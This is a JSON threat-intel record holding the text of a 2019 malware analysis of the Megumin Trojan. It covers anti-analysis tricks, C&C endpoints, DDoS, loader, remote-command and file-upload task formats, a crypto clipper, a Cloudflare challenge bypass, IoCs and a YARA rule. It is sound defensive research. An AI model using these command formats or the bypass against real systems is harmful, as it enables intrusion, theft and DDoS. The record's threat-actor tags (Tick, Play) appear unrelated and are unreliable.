@@ -1,0 +1,182 @@
+{
+    "id": "86b499ef-0b5c-4fde-84a1-2421f6725153",
+    "created_at": "2023-01-12T15:04:34.298664Z",
+    "updated_at": "2025-03-27T02:16:26.553113Z",
+    "deleted_at": null,
+    "sha1_hash": "d5d85fba9840963a3a57aff63e93a5f03eef6e7b",
+    "title": "2019-05-03 - Let’s nuke Megumin Trojan",
+    "authors": "",
+    "file_creation_date": "2022-05-28T01:20:58Z",
+    "file_modification_date": "2022-05-28T01:20:58Z",
+    "file_size": 3857577,
+    "plain_text": "# Let’s nuke Megumin Trojan\n\n**fumik0.com/2019/05/03/lets-nuke-megumin-trojan/**\n\nfumko May 3, 2019\n\n[When you are a big fan of the Konosuba franchise, you are a bit curious when you spot a](https://myanimelist.net/anime/30831/Kono_Subarashii_Sekai_ni_Shukufuku_wo)\nmalware called “Megumin Trojan” (Written in C++) on some selling forums and into some\nresults of sandbox submissions. Before some speculation about when this malware has\nappeared, this one is not recent and there are some elements that prove it was present on\nthe market since the beginning of 2018.\n\nSince the last days, there is an increased activity related to a new version that was probably\nlaunched not so long ago (a v2), and community started to talk about it, but a lot of them has\nmisinterpretation with Vidar due to the utilization of the same boundary beacon string. This\nanalysis will help you to definitely clarify how to spot and understand how Megumin Trojan is\nworking and it definitely has a specific signature, that you can’t miss it with you dig on it (for\nboth network activities & code).\n\nThis malware is a Trojan who has a bunch of features:\n\nDDoS\nMiner\nClipper\n\n\n-----\n\nLoader\nExecuting DOS commands on bots\nUploading specific files from bots to C&C\n\nIt’s time to reverse a little all of that 🙂\n\n## Anti-Analysis Techniques\n\n### The classy PEB\n\nThis malware is using one of the classiest tricks for detecting that the process is currently\n[debugged, by checking a specific field into the Process Environment Block (PEB). For those](https://docs.microsoft.com/en-us/windows/desktop/api/winternl/ns-winternl-_peb)\nwho are unfamiliar with this, it’s a structure that contains all process information.\n```\ntypedef struct _PEB { \n BYTE Reserved1[2]; \n BYTE BeingDebugged; // HERE\n ...< Other fields >...\n PVOID Reserved12[1]; \n ULONG SessionId; \n} PEB, *PPEB;\n\n```\nFor our case, the value “BeingDebugged” will be “obviously” checked. But how it looks like\nwhen reversing it? Here it’s looking like this.\n\nfs:[18] is where is located the [Thread Environment Process (TEB)](https://docs.microsoft.com/fr-fr/windows/desktop/api/winternl/ns-winternl-_teb)\nds:[eax+30] is necessary to have access into the PEB, that is part of the TEB.\nds[eax+2] remains to retrieve the value TEB.PEB.BeingDebugged\n\n\n-----\n\nThis one has been used multiple times during the execution process of Megumin Trojan.\n\n### Window Title\n\nThis other trick used here is to get the title of the program and comparing it with a list of\n[strings. For achieving it, the malware is calling GetForegroundWindow at first for the](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getforegroundwindow)\n[Windows of the current process and then grabbing the title with the help of GetWindowTextA.](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getwindowtexta)\n\nThe comparison with the string is done step by step, by decrypting first the XOR string and\ncomparing it with the Window Title, and continuing the functions until every value is checked.\n\nThe completed string list :\n\nOllyDbg\nIDA\nImmunityDebugger\ninDb (Remain to WinDbg)\nLordP (Remains to LordPE)\nireshark (Remains to Wireshark)\nHTTP Analyzer\n\nThis technique here is not able to work completely because it’s checking the Windows Title\nof the current process used and so, some strings won’t be able to work at all. When I was\nreversing it, I didn’t understand at all why it was done like this, maybe something that was\ndone fast or another unrelated explanation and we will never know.\n\n\n-----\n\n### Dynamic Process Blacklist\n\nWhen the malware is fully configured, it performs an HTTP POST request called /blacklist.\nThe answer contains a list of processes that the attacker wants to kill whenever the payload\nis active, the content is encoded in base64 format.\n\nWhen processes are flagged as blacklisted, those are stored into variables as Process\nHandles, and they are checked and killed by a simple comparison. For terminating them\nthe [ZwTerminateProcess (or NtTerminateProcess if you are looking on a disassembler) API](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-zwterminateprocess)\ncall is used and after the accomplishment of the task, the value on memory is initialized\nagain to -1 for continuing, again and again, to maintain that these processes will never be\nable to be active whenever the malware is up.\n\nBy default, all values are set to -1 (0xFFFFFFFF)\n\n## Network interactions list\n\nMegumin is quite noisy, in term of interactions between bots and the C&C, and the amount of\nAPI request is more than usual compared to the other malwares that I have analyzed. So to\nmake as much as possible simple and understandable, I classified them into three\ncategories.\n\n### General commands\n\n/suicide Killing request\n\n/config Malware config\n\n/msgbox Fake message prompt window\n\n/isClipper is Clipper activated\n\n/isUSB Is set up to spread itself on removable drives\n\n/blacklist Process blacklist\n\n\n-----\n\n/wallets Wallet config for the clipper part\n\n/selfDel Removing the payload of the original PE\n\n### Bot commands\n\n/addbot?hwid= Add a new bot to the C&C (*)\n\n/task?hwid= Ask for a task\n\n/completed?hwid= Tell the C&C that task has been done\n\n/gate?hwid= Gate for uploading/stealing specific files from bot to C&C\n\n/reconnecttime Amount of time for next request between bot and C&C\n\n(*) Only when the User-Agent is strictly configured as “Megumin/2.0”\n\n### Miner commands\n\n/cpu CPU Miner configuration\n\n/gpuAMD GPU AMD Miner Configuration\n\n/gpuNVIDIA GPU NVIDIA Miner Configuration\n\n**_As a reminder, all response from the server are encoded in base64 with the only_**\n**_exception of the /config one, which is in clear._**\n\nCuriosity: This malware is also using the same boundary beacon as Vidar and some other\nmalware.\n\n## That “messy” setup\n\nThis trojan is quite curious about how it’s deploying itself and the first time I was trying to\nunderstand the mess, I was like, seriously what the heck is wrong with the logic of this\nmalware. After that, I thought it was just the only thing weird with megumin, but no. To\ncomplexify the setup, interactions with the C&C are different between different stages.\n\nFor explaining everything, I decided to split it into multiple steps, to slowly understand the\nchronological order of it.\n\n### Step 1\n\n\n-----\n\nIn the first request, the malware is downloading a payload named reserv.exe . if this\nfile is not empty it means the current payload is not the main build of the malware.\nreserv.exe is downloaded and saved into a specific folder hidden in\n%PROGRAMDATA% as “{MACHINE_GUID}” (for example {656a1cdc-0ae0-40d0_a8bb-fdbd603c3b13}),this file at the end is renamed as “update.exe”._\nThen two or three requests are performed\n\n/suicide\n/msgbox\n/selfDel (optional)\nA scheduled task is created with this specific pattern for the persistence, the name of\nthe payload will be “update.exe” and another one on the registry.\n\n“Scheduled Updater – {*MACHINE_GUID*}”\nThen the payload is killed and removed\n\n_Reminder: If the malware was not fast enough to download reserv.exe for whatever reasons,_\n_it is named by a random windows process name, and will continue the process over and over_\n_until it will grab reserv.exe_\n\n_Curiosity: The way this malware is creating a folder into PROGRAMDATA is strictly the same_\n_way as Arkei,_ _[Baldr,](https://blog.malwarebytes.com/threat-analysis/2019/04/say-hello-baldr-new-stealer-market/)_ _[Rarog &](https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/)_ _[Supreme++ (Rarog fork).](https://tracker.fumik0.com/malware/Supreme++)_\n\nMegumin\n\nArkei\n\nRarog\n\n### Step 2\n\nreserv.exe is again downloaded, and considering the file is empty, so at that time, the\ncorrect build for communicating with the C&C.\n\n\n-----\n\nThose requests are performed\n\n/suicide\n/msgBox\n/config\n\nThe config is the only request was the server is not encoding it in base64 format, there are 4\noptions possible.\n\nOption 1 USB task (Spreading the build on removable drives)\n\nOption 2 Clipper\n\nOption 3 ???\n\nOption 4 ???\n\nA scheduled task is created with this specific pattern for the persistence and the name\nof the payload is at that time a random known legitimate windows process (also same\nthing on the registry).\n\n“Scheduled Updater – {*MACHINE_GUID*}”\nThen the payload is killed and removed\n\nIf this file is empty, it’s considered that it reached its final destination and its final C&C, so\nseeing two Megumin C&C on the same domain could be explainable by this (and It was the\ncase on my side).\n\n### Step 3\n\nreserv.exe is always checked for checking if there is a new build\nNow the behavior on the network flows is totally new. The bot is now way more\ntalkative and is going to be fully set up and registered to the C&C.\n\n/suicide\n/config\n/addbot?hwid=…&….. # Registration\n/blacklist\n/wallets\n/task?hwid=… # Performs a task\n… a lot of possible tasks (explained below)\n/completed?hwid=… # Alerting that the task is done\n/reconnecttime\n\nFor the addbot part, the registration is requiring specific fields that will be all encoded in\nbase64 format.\n\nMachine GUID\n\n\n-----\n\nPlatform\nWindows version\nCPU Name\nGPU Name\nAntivirus\nFilename (name of the megumin payload)\nUsername\n\nexample of request (Any.Run)\n\n_http://90551.prohoster.biz/megumin/addbot?_\n_hwid=OTAwNTljMzctMTMyMC00MWE0LWI1OGQtMmI3NWE5ODUwZDJm&bit=eDMy&win_\n_[=V2luZG93cyA3IFByb2Zlc3Npb25hbA==&cpu=SW50ZWwoUikgQ29yZShUTSkgaTUtNjQw](http://90551.prohoster.biz/megumin/addbot?hwid=OTAwNTljMzctMTMyMC00MWE0LWI1OGQtMmI3NWE5ODUwZDJm&bit=eDMy&win=V2luZG93cyA3IFByb2Zlc3Npb25hbA==&cpu=SW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6AAAAAAAAAAAA&gpu=U3RhbmRhcmQgVkdBIEdyYXBoaWNzIEFkYXB0ZXI=&av=VW5rbm93bg==&filename=Y3Nyc3MuZXhl&username=YWRtaW4=)_\n_MCBDUFUgQCAyLjcwR0h6AAAAAAAAAAAA&gpu=U3RhbmRhcmQgVkdBIEdyYXBoaWNz_\n_IEFkYXB0ZXI=&av=VW5rbm93bg==&filename=Y3Nyc3MuZXhl&username=YWRtaW4=_\n\n### Step 4\n\nreserv.exe is always checked for checking if there is a new build\nIf the bot is run after the registration, it will be possible to have this pattern of request\n\n/suicide\n/config\n/task?hwid=… # Performs task\n… a lot of possible tasks (explained below)\n/completed?hwid=… # Alerting that the task is done\n/reconnecttime\n\n## Fake messages\n\nAs shown above, the malware has also a feature to prompt a fake window and this could be\nused for making “some realistic scenario” of a typical fake software, crack or other crapware,\nlure the user during the execution that the software has been installed or there is an error\nduring the false installation or execution. It’s really common to see nowadays fake prompt\nwindow for missing runtime DLL, or fake Fortnite hack or whatever Free Bitcoin trap\ngenerator, this kind of lure will always work in some kind of people, even more with kids.\n\nFor configuring the feature, the bot is sending a specific HTTP POST Request named\n“/msgbox” and After decoding the base64 response from the server the response is split into\nmultiple variables :\n\nAn integer value that will represent the Icon of the Window\nA second int value that will represent the buttons that will be used\nThe caption (Title)\nThe text that will be printed on the prompt window\n\n\n-----\n\nCorresponding case input codes with the configuration of the prompt window are classified\nbelow:\n\nuType – Uint Code – Icons – cases\n\nCase Code Value Meaning\n\n1 0x00000020L Question-mark message box\n\n2 0x00000030L Information message box\n\n3 0x00000040L Warning message box\n\nuType – Uint Code – Buttons – cases\n\nCase Code Value Meaning\n\n0 0x00000002L Abort, Retry & Ignore buttons\n\n1 0x00000006L Cancer, Try Again, Continue buttons\n\n2 0x00004000L Help button\n\n3 0x00000000L OK button\n\n4 0x00000001L OK & Cancel buttons\n\n5 0x00000005L Retry & Cancel buttons\n\n6 0x00000004L Yes & No buttons\n\n7 0x00000003L Yes, No & Cancel buttons\n\n## Clipper\n\n\n-----\n\nBefore that the malware is executing the main module, all the regexes that will be used for\ncatching the whished data are stored dynamically into memory.\n\nThen when the malware is fully installed if the clipping feature is activated by the config\nrequest, another one called “/wallet” is performed. This command gives to the bot the list of\nall wallet configured to be clipped. the content is base64 encoded.\n\n[At this point, the classy infinite loop like Qulab is performed and will remain the same until](https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/)\nthe program is killed or crashed.\n\n1. The content of the clipboard is stored into a variable.\n2. Step by step, all regexes are checking if it matches with the clipboard.\n3. If one regex triggers something, the content on the clipboard is switched by the one\n\nthat the attacker wants and some data are sent to the C&C.\n```\n/newclip?hwid=XXX&type=XXX&copy=XXX&paste=XXX&date=XXX\n\n```\nThe whole process of the clipper is representing like this.\n\nFor some investigation, this is the complete list of wallets, softwares, and websites targeted\nby this malware.\n\nBitcoin BitcoinGold BtcCash Ethereum\n\nBlackCoin ByteCoin EmerCoin ReddCoin\n\nPeercoin Ripple Miota Cardano\n\nLisk Stratis Waves Qtum\n\nStellar ViaCoin Electroneum Dash\n\nDoge LiteCoin Monero Graft\n\nZCash Ya.money Ya.disc Steam\n\nvk.cc QIWI\n\n\n-----\n\n## Tasks\n\n\n-----\n\nWhen the bot is sending a request to the C&C, there is a possibility to have nine different\ntasks to be performed and they are all presenting like this.\n```\n<name>|<command>|...\n\n```\nThere are currently 3 main fields for the tasks.\n\nDDoS\nExecuting files\nMiscellaneous\n\nWhenever a task is accomplished, the request “/completed?hwid=” is sent to the C&C. The\nreason for this is simple, tasks can be counted and when it reaches a specific amount, the\ntask is simply deactivated.\n\nLet’s reviewing them!\n\n\n-----\n\n### DDoS\n\n**Socket HTTP**\n\n\n-----\n\nTask format\n```\nsocket|time|threads|link\n\n```\n[When there is a necessity to create threads for performing the DDoS tasks, it only grabs the](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread)\nspecific fields and using it a length for a thread loop creation as shown below, lpStartAddress\nwill contain the reference of the specific DDoS function that the bot has to do.\n\nWhen inspecting it the function, we can see the layer 7 DDoS Attack by flooding the server\nby HTTP GET requests with the help of sockets.\n\n\n-----\n\n[When everything is configured, the send function is called for starting the DDoS.](https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-send)\n\n**HTTP**\n\nTask format\n```\nhttp|time|threads|link\n\n```\nAs explained above, the technique will remain always the same for the thread setup, only the\nfunction addressed is different. For the HTTP DDoS task, it’s another Layer 7 DDoS Attack\nby flooding the server with HTTP requests by using the methods from the Wininet library :\n\n[InternetOpenA](https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetopena)\n[InternetConnectA](https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-internetconnecta)\n[HttpOpenRequestA](https://docs.microsoft.com/en-us/windows/desktop/api/wininet/nf-wininet-httpopenrequesta)\n\nIt’s slower than the “socket” tasks, but it used for the case that the server is using 301\nredirects.\n\n**TCP**\n\n\n-----\n\nTask format\n```\ntcp|time|threads|port|link\n\n```\nThe TCP task is Layer 4 DDoS Attack, by performing spreading the server TCP sockets\nrequests with a specified port.\n\n**JS Bypass**\n\nTask format\n```\njsbypass|time|threads|link\n\n```\nWhen the website is using Cloudflare protection, the malware is also configured to use a\nknown trick to bypass it by creating a clearance cookie for not being able to be challenged\nanymore.\n\n\n-----\n\nThe idea is when it’s reaching for the first time the Website, a 503 error page will redirecting\nthe attacker into a waiting page (catchable by the string “Just a moment” as shown above),\nAt this moment Cloudflare is, in fact, sending the challenging request, so a __cfduid cookie\nis generated and the content of the source code on this page is fetched by the help of a\nparser implemented in the malware. It needs 3 parameters at least, 2 of them are already\navailable :\n\njschl_vc the challenge token\n\npass ???\n\nThe last field is the jschl_answer, as guessable this is the answer to the challenge asked by\nCloudflare. To solve it, an interpreter was also implemented to parse the js code, catching\nthe challenge-form value and a.value field for interpreting correctly the native code with the\nright setup.\n\nThis process shown as below is the interpreter that will analyze block per block the challenge\nwith the help of a loop, the data is shelled and each block will be converted into an integer\nvalue, the sum of all of them will give us the jschl_answer value.\n\n\n-----\n\nso at the end of the waiting page, this request is sent:\n```\n/cdn-cgi/l/chk_jschl?jschl_vc=VALUE&pass=VALUE&jschl_answer=VALUE\n\n```\n\n-----\n\nchk_jschl leads to the cf_clearance cookie creation if the answer to the challenge is correct\nand this cookie is proof that you are authentic and trusted by Cloudflare, so by keeping it\nbypasses for the next requests sent, the website will no longer challenging the attacker\ntemporarily.\n\n**Miscellaneous curiosities**\n\nthe default values for DDoS tasks are :\n\nTime 180 (in seconds)\n\nThreads 2500\n\nPort 42\n\n### Loader\n\n**Load**\n\nTask format\n```\nload|link\n\n```\nSeeing a loader feature is something that a quite common thing by the current trendings,\ncustomers that bought malware wants to maximize their investments at all cost. This trojan is\nalso configured to pushed some payloads. There is nothing much to say about this. The only\nimportant element, in this case, it’s that the loaded payload is stored into the\n%PROGRAMDATA% folder with the name of {MACHINE_GUID}.exe.\n\n**Load PE**\n\nTask format\n```\nloadpe|link\n\n```\nContrary to a simple loader feature, this one is typically a process hollowing alternative. It’s\nonly working with 32 bits payload and using this classy process injection trick into a\nlegitimate process.\n\n\n-----\n\nFor some reasons, the User-Agent “Mozilla/5.0 (Windows NT 6.1) Megumin/2.0” is catchable\nwhen it’s downloading the payload on this specific load PE task.\n\n[More information about process injections techniques here](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)\n\n**Update**\n\nTask format\n```\nupdate|build_link\n\n```\nWhen there is an update required with the malware, there is a possibility to push a new build\nto the bot by using this task.\n\n### Miscellaneous tasks\n\n**cmd**\n\nTask format\n```\ncmd|command\n\n```\nOne of the miscellaneous tasks possible is the possibility to send some cmd commands on\nthe bot. I don’t have a clue about the necessity of this task, but if it’s implemented, there is a\nreason for that.\n\n[Complete list available here](https://ss64.com/nt/)\n\n\n-----\n\n**upload**\n\nTask format\n```\nupload|fullpath\n\n```\nIf the attacker knows exactly what he’s doing, he can steal some really specific files on the\nbot, by indicating the full path of the required one. The crafted request at the end will be on\nthat form, for pushing it on the C&C.\n```\n/gate?hwid=XXX\n\n## Miner\n\n```\nThe miner is one of the main features of the trojan. Most of the time, When analysts are\nreversing a miner, this is really easy to spot things and the main ideas are to understand the\nsetup part and how it’s executing the miner software.\n\nAt the end for future purposes, I am considering their check-up list as relevant when\nreversing one:\n\nIs it targeting CPU, GPU or both?\nIf it’s GPU, is Nvidia & AMD targeted?\nIs it generating a JSON config?\nWhat miner software is/are used\nAre there any Blacklist Country or Specific countries spotted to mine?\nWhat are the pools addresses?\n\nOn this malware, Both hardware type has been implemented, and for checking which miner\nsoftware is required on the GPU part, it only checking the name of the GPU on the bot, if\nNvidia or AMD is spotted on the text, request to the C&C will give the correct setup and\nminer software.\n\nThe base64 downloaded miner config contains two things:\n\nThe link of the miner software\nThe one-line config that will be executed with the downloaded payload by the help of\n[ShellExecuteA](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)\n\nFor some reasons, the User-Agent “Mozilla/5.0 (Windows NT 6.1) Megumin/2.0” is only\ncatchable when it’s downloading the miner software for the CPU part, not for the GPU.\n\n## Server-side\n\n\n-----\n\n### Login Page\n\nThe login page is quite fancy, simplest. Even if I could be wrong of with this statement, it’s\nusing the same core template as Supreme++ (Rarog Fork) with some tweaks.\n\nSomething interesting to notice with this C&C, that there is no password but a 2FA Google\nauthenticator on the authentication part.\n\n### Dashboard\n\nThere is not too much to say about the dashboard, its a classy stats page with these\nelements:\n\nTop Countries\nNew bots infected (weekly)\nBots Windows Chart\nNumber of bots online (weekly)\nBots CPU chart\nBots GPU chart\nPlatform chart\nAV Stats\nCurrent cryptocurrencies values\nTop stolen wallet by the clipper\n\n\n-----\n\n-----\n\n-----\n\n### Bots\n\n\nBots – Current list of bots\nTasks – Task creation & current task list\nFiles – All files that have been uploaded to the C&C with the help of the task “upload”\n\n\n-----\n\n### Task setup\n\nTasks that I’ve detailed above are representing like this on the C&C, as usual, it’s designed\nto be user-friendly for customers, they just want to configure fast and easily their stuff to be\nable to steal & being profitable quickly as possible.\n\n\n-----\n\nWhen selected, there is a usual configuration setup for the task, with classy fields like :\n\nTask Name\nMax Executions routine\nIf the Task must be designed for targeting only one bot\nAnd an interesting advanced setting tab\n\n\n-----\n\nIf we look at it, the advanced setting is where the C&C could targeting bots by :\n\nSpecific hardware requirements\nPlatform\nCountries\n\nCountries can be easily catchable on the Victim machine by checking the Locale of the\n[Keyboard (I have already explained this tick on Vidar) and the IP.](https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/)\n\n\n-----\n\nSo it means that malware could be designed to target highly specific areas.\n\nWhen the task is completed, its represented like this.\n\n### Clips\n\n\n-----\n\n### Settings\n\n**Bots**\n\n“USB Spreading” remains to /isUSB API request\n“Del exe after start” remains to /selfDel API request\n\n**Clipper**\n\nClipper is quite simple, it’s just the configuration of all wallet that will be clipped.\n\n\n-----\n\n**Miner**\n\nThe miner tab is quite classy also, just a basic configuration of the config and where it will\ndownload the payload.\n\nAs usual, the process blacklist will remain the same as we saw in other miner malware.\nSome google search will be sufficient to know which processes are the most targeted.\n\n**MessageBox**\n\nA fancy message box configuration part with multiple possibilities.\n\n\n-----\n\n**Countries**\n\nIt’s also possible to ban bots from specific countries, on the side bot side, the malware will\ncheck if the country is valid or not with the help of the IP and the Keyboard Language\nconfiguration.\n\nOn the code, it’s easily traceable by these checks, for more explanation about how it works\nfor the keyboard part, this is already detailed on the Vidar paper.\n\n**Panel**\n\nFor some reasons, there is also a possibility to change the username for the panel\nauthentication, by doing this the 2FA Google Authenticator is required for confirming this.\n\n## Script\n\n\n-----\n\nFor further investigation about this v2, I developed a small script called ohana, like the\nVidar one to extract the configuration of each sample and it’s already available on my GitHub\nrepository.\n\n## IoCs\n\nHashes\n\nd15e1bc9096810fb4c954e5487d5a54f8c743cfd36ed0639a0b4cb044e04339f\ne6c447c826ae810dec6059c797aa04474dd27f84e37e61b650158449b5229469\nc70120ee9dd25640049fa2d08a76165948491e4cf236ec5ff204e927a0b14918\nd431e6f0d3851bbc5a956c5ca98ae43c3a99109b5832b5ac458b8def984357b8\ned65610f2685f2b8c765ee2968c37dfce286ddcc31029ee6091c89505f341b97\n89813ebf2da34d52c1b924b408d0b46d1188b38f035d22fab26b852ad6a6fc19\n8777749af37a2fd290aad42eb87110d1ab7ccff4baa88bd130442f25578f3fe1\n\nDomains\n\n90551.prohoster.biz\nbaldorclip.icu\nsantaluisa.top\nmegumin.top\nmegumin.world\n\nPDB\n\nC:\\Users\\Ddani\\source\\repos\\MeguminV2\\Release\\MeguminV2.pdb\nC:\\Users\\Administrator\\Desktop\\MeguminV2\\Release\\MeguminV2.pdb\n\n**Threat Actors**\n\nDanij (Main)\nMoongod\n\n\n-----\n\n## MITRE ATT&CK\n\n Yara\n```\nrule Megumin : Megumin {\n meta:\n  description = \"Detecting Megumin v2\"\n  author = \"Fumik0_\"\n  date = \"2019-05-02\"\n strings:\n  $mz = {4D 5A}\n  $s1 = \"Megumin/2.0\" wide ascii\n  $s2 = \"/cpu\" wide ascii\n  $s3 = \"/task?hwid=\" wide ascii\n  $s4 = \"/gate?hwid=\" wide ascii\n  $s5 = \"/suicide\" wide ascii\n condition:\n  $mz at 0 and (all of ($s*))\n}\n\n Conclusion\n\n```\nMegumin Trojan is not a complicated malware but about all the one that I have reversed, this\nis the most talkative one that I’ve analyzed and possesses a quite some amount of tasks.\nLet’s see with the time how this one will evolve, but it’s confirmed at that time, there is\ncurrently a lot of interesting stuff to do with this one :\n\nin term of analysis\nin term of cybercrime investigation\n\n\n-----\n\n#HappyHunting\n#WeebMalware\n\n[Special Thanks: S!Ri](https://twitter.com/siri_urz)\n\nPhoto by [Jens Johnsson on](https://unsplash.com/photos/-N1_Vhyqd50?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) [Unsplash](https://unsplash.com/search/photos/explosion?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-03 - Let’s nuke Megumin Trojan.pdf"
+    ],
+    "report_names": [
+        "2019-05-03 - Let’s nuke Megumin Trojan.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
+            "created_at": "2023-01-06T13:46:38.626906Z",
+            "updated_at": "2025-03-27T02:00:02.877001Z",
+            "deleted_at": null,
+            "main_name": "Tick",
+            "aliases": [
+                "Stalker Taurus",
+                "PLA Unit 61419",
+                "Nian",
+                "BRONZE BUTLER",
+                "REDBALDKNIGHT",
+                "STALKER PANDA",
+                "G0060"
+            ],
+            "source_name": "MISPGALAXY:Tick",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
+            "created_at": "2022-10-25T16:07:23.419513Z",
+            "updated_at": "2025-03-27T02:02:09.790389Z",
+            "deleted_at": null,
+            "main_name": "Bronze Butler",
+            "aliases": [
+                "Bronze Butler",
+                "CTG-2006",
+                "Operation ENDTRADE",
+                "RedBaldNight",
+                "Stalker Panda",
+                "Stalker Taurus",
+                "TEMP.Tick",
+                "Tick"
+            ],
+            "source_name": "ETDA:Bronze Butler",
+            "tools": [
+                "8.t Dropper",
+                "8.t RTF exploit builder",
+                "8t_dropper",
+                "9002 RAT",
+                "AngryRebel",
+                "Blogspot",
+                "Daserf",
+                "Datper",
+                "Elirks",
+                "Farfli",
+                "Gh0st RAT",
+                "Ghost RAT",
+                "HOMEUNIX",
+                "HidraQ",
+                "HomamDownloader",
+                "Homux",
+                "Hydraq",
+                "Lilith",
+                "Lilith RAT",
+                "McRAT",
+                "MdmBot",
+                "Mimikatz",
+                "Minzen",
+                "Moudour",
+                "Muirim",
+                "Mydoor",
+                "Nioupale",
+                "PCRat",
+                "POISONPLUG.SHADOW",
+                "Roarur",
+                "RoyalRoad",
+                "ShadowPad Winnti",
+                "ShadowWali",
+                "ShadowWalker",
+                "SymonLoader",
+                "WCE",
+                "Wali",
+                "Windows Credential Editor",
+                "Windows Credentials Editor",
+                "XShellGhost",
+                "XXMM",
+                "gsecdump",
+                "rarstar"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
+            "created_at": "2022-10-25T16:47:55.541639Z",
+            "updated_at": "2025-03-27T02:05:17.253496Z",
+            "deleted_at": null,
+            "main_name": "BRONZE BUTLER",
+            "aliases": [
+                "Daserf",
+                "Stalker Panda ",
+                "Tick ",
+                "CTG-2006 "
+            ],
+            "source_name": "Secureworks:BRONZE BUTLER",
+            "tools": [
+                " DGet",
+                " Daserf",
+                " Datper",
+                " Gofarer",
+                " MSGet",
+                " Mimikatz",
+                " RarStar",
+                " Screen Capture Tool",
+                " ShadowPad",
+                " T-SMB",
+                " WinRAR",
+                " Windows Credential Editor",
+                " gsecdump",
+                " xmm downloader",
+                " xxmm",
+                "ABK"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535874,
+    "ts_updated_at": 1743041786,
+    "ts_creation_date": 1653700858,
+    "ts_modification_date": 1653700858,
+    "files": {
+        "pdf": "https://archive.orkl.eu/d5d85fba9840963a3a57aff63e93a5f03eef6e7b.pdf",
+        "text": "https://archive.orkl.eu/d5d85fba9840963a3a57aff63e93a5f03eef6e7b.txt",
+        "img": "https://archive.orkl.eu/d5d85fba9840963a3a57aff63e93a5f03eef6e7b.jpg"
+    }
+}
